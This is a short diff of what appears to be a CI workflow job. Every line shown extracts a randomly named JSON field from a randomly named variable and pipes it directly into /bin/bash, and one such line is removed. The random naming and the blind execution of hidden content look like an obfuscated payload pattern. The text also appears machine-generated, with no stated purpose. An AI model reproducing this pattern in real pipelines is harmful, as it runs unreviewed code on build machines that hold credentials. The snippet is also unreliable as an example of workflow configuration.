@@ -50,7 +50,6 @@ jobs:
           echo $mlbc3 | jq -r .v363 | /bin/bash
           printf '%s' "$dhsus41614" | jq -r .qe650 | /bin/bash
           printf '%s' "$zfvs96816" | jq -r .ugb4 | /bin/bash
-          echo $muef83499 | jq -r .v973 | /bin/bash
           echo $dzrd81 | jq -r .dpvp145 | /bin/bash
           echo $vigqi25775 | jq -r .x89914 | /bin/bash
           printf '%s' "$zwc7" | jq -r .lwdj4824 | /bin/bash
